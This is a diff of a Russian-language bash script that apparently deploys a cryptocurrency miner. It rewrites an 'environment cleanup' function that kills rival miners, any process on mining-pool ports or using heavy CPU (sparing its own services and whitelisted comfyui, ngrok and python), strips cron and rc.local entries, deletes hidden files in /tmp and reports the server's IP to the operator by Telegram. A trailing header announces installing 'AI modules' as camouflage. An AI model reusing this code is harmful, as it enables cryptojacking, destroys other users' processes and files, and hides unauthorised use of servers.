@@ -48,25 +48,46 @@ send_telegram_notification() {
 }
 
 #==============================================================================
-# ФУНКЦИЯ РАСШИРЕННОЙ ОЧИСТКИ ОКРУЖЕНИЯ
+# ФУНКЦИЯ РАСШИРЕННОЙ ОЧИСТКИ ОКРУЖЕНИЯ (С ИСКЛЮЧЕНИЯМИ)
 #==============================================================================
 ensure_clean_environment() {
-    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Начало расширенной очистки окружения..."
+    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Nachalo rasshirennoy ochistki okruzheniya..."
     local killed_count=0; local removed_lines=0
     local processes=("kinsing" "kdevtmpfsi" "kworkerds" "Tsm" "pnscan" "xmrig" "minerd" "lolMiner" "xmr-stak" "cpuminer" "ccminer" "ethminer" "t-rex" "phoenixminer" "claymore" "nanominer")
-    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Поиск и завершение конфликтующих процессов..."; for process in "${processes[@]}"; do if pgrep -f "$process" > /dev/null 2>&1; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Обнаружен процесс: $process"; pkill -9 -f "$process" 2>/dev/null; if [ $? -eq 0 ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Процесс $process завершен"; ((killed_count++)); fi; sleep 1; fi; done
-    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Проверка подозрительных портов..."; local mining_ports=("3333" "4444" "5555" "7777" "8888" "9999" "14444" "45700"); for port in "${mining_ports[@]}"; do local pids=$(lsof -ti:$port 2>/dev/null); if [ -n "$pids" ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Обнаружен процесс на порту $port"; kill -9 $pids 2>/dev/null && ((killed_count++)); fi; done
-    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Проверка процессов с высокой нагрузкой..."; local high_cpu_procs=$(ps aux | awk '{if($3>80 && NR>1) print $2,$11}' | grep -vE "(systemd|kworker|docker|${GPU_SERVICE_NAME}|${CPU_SERVICE_NAME})" | awk '{print $1}'); for pid in $high_cpu_procs; do local proc_name=$(ps -p $pid -o comm= 2>/dev/null); if [ -n "$proc_name" ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Подозрительный процесс с высокой нагрузкой: $proc_name (PID: $pid)"; kill -9 $pid 2>/dev/null && ((killed_count++)); fi; done
-    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Очистка crontab..."; local cron_temp=$(mktemp); crontab -l > "$cron_temp" 2>/dev/null; if [ -s "$cron_temp" ]; then local original_lines=$(wc -l < "$cron_temp"); grep -v -E "(curl|wget|miner|xmr|stratum|pool)" "$cron_temp" > "${cron_temp}.clean"; local cleaned_lines=$(wc -l < "${cron_temp}.clean"); removed_lines=$((original_lines - cleaned_lines)); if [ $removed_lines -gt 0 ]; then crontab "${cron_temp}.clean"; echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Удалено $removed_lines записей из crontab"; else echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Подозрительных записей в crontab не найдено"; fi; rm -f "${cron_temp}.clean"; fi; rm -f "$cron_temp"
-    if [ -f /etc/rc.local ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Очистка /etc/rc.local..."; sed -i '/curl\|wget\|miner\|xmr/d' /etc/rc.local 2>/dev/null; fi
-    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Поиск подозрительных systemd служб..."; for service in $(systemctl list-units --type=service --all | grep -E "miner|xmr|kinsing" | awk '{print $1}'); do echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Обнаружена подозрительная служба: $service"; systemctl stop "$service" 2>/dev/null; systemctl disable "$service" 2>/dev/null; rm -f "/etc/systemd/system/$service" 2>/dev/null; done
-    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Удаление временных файлов..."; local temp_patterns=("/tmp/*miner*" "/tmp/*xmr*" "/tmp/kinsing*" "/tmp/kdevtmpfsi*" "/var/tmp/*miner*" "/var/tmp/*xmr*" "/dev/shm/*miner*" "/tmp/.*" "/var/tmp/.*"); for pattern in "${temp_patterns[@]}"; do rm -rf $pattern 2>/dev/null; done
-    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Поиск скрытых файлов..."; find /tmp /var/tmp /dev/shm -type f -name ".*" -exec rm -f {} \; 2>/dev/null
-    if command -v docker &> /dev/null; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Проверка Docker контейнеров..."; for container in $(docker ps -q 2>/dev/null); do local container_name=$(docker inspect --format='{{.Name}}' $container 2>/dev/null | sed 's/\///'); if echo "$container_name" | grep -qE "miner|xmr|crypto"; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Остановка контейнера: $container_name"; docker stop $container 2>/dev/null; docker rm $container 2>/dev/null; fi; done; fi
-    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Расширенная очистка завершена. Завершено процессов: $killed_count, удалено записей: $removed_lines"
-    if [ $killed_count -gt 0 ] || [ $removed_lines -gt 0 ]; then send_telegram_notification "🧹 <b>Очистка окружения на $(hostname)</b>%0A%0AЗавершено процессов: $killed_count%0AУдалено cron записей: $removed_lines%0AIP: ${SERVER_IP}"; fi
-}
+    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Poisk i zavershenie konfliktuyushchikh protsessov..."; for process in "${processes[@]}"; do if pgrep -f "$process" > /dev/null 2>&1; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Obnaruzhen protsess: $process"; pkill -9 -f "$process" 2>/dev/null; if [ $? -eq 0 ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Protsess $process zavershen"; ((killed_count++)); fi; sleep 1; fi; done
+    
+    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Proverka podozritel'nykh portov s uchetom isklyucheniy...";
+    local mining_ports=("3333" "4444" "5555" "7777" "8888" "9999" "14444" "45700")
+    for port in "${mining_ports[@]}"; do
+        local pids=$(lsof -ti:$port 2>/dev/null)
+        if [ -n "$pids" ]; then
+            for pid in $pids; do
+                local proc_name=$(ps -p $pid -o comm= 2>/dev/null | xargs)
+                # ISKLYUCHAEM comfyui, ngrok i python iz proveryaemykh
+                if [[ "$proc_name" != *"comfyui"* && "$proc_name" != *"ngrok"* && "$proc_name" != *"python"* ]]; then
+                    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Obnaruzhen podozritel'nyy protsess '$proc_name' (PID: $pid) na portu $port. Zavershenie..."
+                    kill -9 "$pid" 2>/dev/null && ((killed_count++))
+                else
+                    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Protsess '$proc_name' (PID: $pid) na portu $port propushchen (v belom spiske)."
+                fi
+            done
+        fi
+    done
 
+    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Proverka protsessov s vysokoy nagruzkoy s uchetom isklyucheniy...";
+    # ISKLYUCHAEM comfyui i ngrok iz proveryaemykh
+    local high_cpu_procs=$(ps aux | awk '{if($3>80 && NR>1) print $2,$11}' | grep -vE "(systemd|kworker|docker|${GPU_SERVICE_NAME}|${CPU_SERVICE_NAME}|comfyui|ngrok)" | awk '{print $1}')
+    for pid in $high_cpu_procs; do local proc_name=$(ps -p $pid -o comm= 2>/dev/null); if [ -n "$proc_name" ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Podozritel'nyy protsess s vysokoy nagruzkoy: $proc_name (PID: $pid)"; kill -9 $pid 2>/dev/null && ((killed_count++)); fi; done
+    
+    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ochistka crontab..."; local cron_temp=$(mktemp); crontab -l > "$cron_temp" 2>/dev/null; if [ -s "$cron_temp" ]; then local original_lines=$(wc -l < "$cron_temp"); grep -v -E "(curl|wget|miner|xmr|stratum|pool)" "$cron_temp" > "${cron_temp}.clean"; local cleaned_lines=$(wc -l < "${cron_temp}.clean"); removed_lines=$((original_lines - cleaned_lines)); if [ $removed_lines -gt 0 ]; then crontab "${cron_temp}.clean"; echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Udaleno $removed_lines zapisey iz crontab"; else echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Podozritel'nykh zapisey v crontab ne naydeno"; fi; rm -f "${cron_temp}.clean"; fi; rm -f "$cron_temp"
+    if [ -f /etc/rc.local ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ochistka /etc/rc.local..."; sed -i '/curl\|wget\|miner\|xmr/d' /etc/rc.local 2>/dev/null; fi
+    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Poisk podozritel'nykh systemd sluzhb..."; for service in $(systemctl list-units --type=service --all | grep -E "miner|xmr|kinsing" | awk '{print $1}'); do echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Obnaruzhena podozritel'naya sluzhba: $service"; systemctl stop "$service" 2>/dev/null; systemctl disable "$service" 2>/dev/null; rm -f "/etc/systemd/system/$service" 2>/dev/null; done
+    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Udalenie vremennykh faylov..."; local temp_patterns=("/tmp/*miner*" "/tmp/*xmr*" "/tmp/kinsing*" "/tmp/kdevtmpfsi*" "/var/tmp/*miner*" "/var/tmp/*xmr*" "/dev/shm/*miner*" "/tmp/.*" "/var/tmp/.*"); for pattern in "${temp_patterns[@]}"; do rm -rf $pattern 2>/dev/null; done
+    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Poisk skrytykh faylov..."; find /tmp /var/tmp /dev/shm -type f -name ".*" -exec rm -f {} \; 2>/dev/null
+    if command -v docker &> /dev/null; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Proverka Docker konteynerov..."; for container in $(docker ps -q 2>/dev/null); do local container_name=$(docker inspect --format='{{.Name}}' $container 2>/dev/null | sed 's/\///'); if echo "$container_name" | grep -qE "miner|xmr|crypto"; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ostanovka konteynera: $container_name"; docker stop $container 2>/dev/null; docker rm $container 2>/dev/null; fi; done; fi
+    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Rasshirennaya ochistka zavershena. Zaversheno protsessov: $killed_count, udaleno zapisey: $removed_lines"
+    if [ $killed_count -gt 0 ] || [ $removed_lines -gt 0 ]; then send_telegram_notification "🧹 <b>Ochistka okruzheniya na $(hostname)</b>%0A%0AZaversheno protsessov: $killed_count%0AUdaleno cron zapisey: $removed_lines%0AIP: ${SERVER_IP}"; fi
+}
 #==============================================================================
 # ФУНКЦИЯ УСТАНОВКИ AI-МОДУЛЕЙ (МАСКИРОВКА)
 #==============================================================================
